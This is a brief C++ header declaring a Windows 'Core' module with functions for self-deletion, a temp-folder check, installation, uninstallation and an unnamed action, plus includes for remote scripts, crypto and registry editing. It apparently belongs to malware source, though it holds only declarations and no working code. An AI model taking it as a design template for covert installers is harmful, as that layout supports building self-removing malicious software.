#ifndef CORE_H
#define CORE_H
#include <shlobj.h>
#include "structs.h"
#include "config.h"
#include "resource.h"
#include "remotescript.h"

#include "..\Common\defines.h"
#include "..\Common\crypt.h"
#include "..\Common\os.h"
#include "..\Common\time.h"
#include "..\Common\user.h"
#include "..\Common\regedit.h"
#include "..\Common\file.h"
#include "..\Common\string.h"

namespace Core{
	DWORD init(void);
	DWORD uninit(void);
	BOOL _checkInTemp();
	DWORD _run();
	DWORD _selfDelete();
	DWORD _install();
	DWORD _uninstall();
	DWORD _action();
};
#endif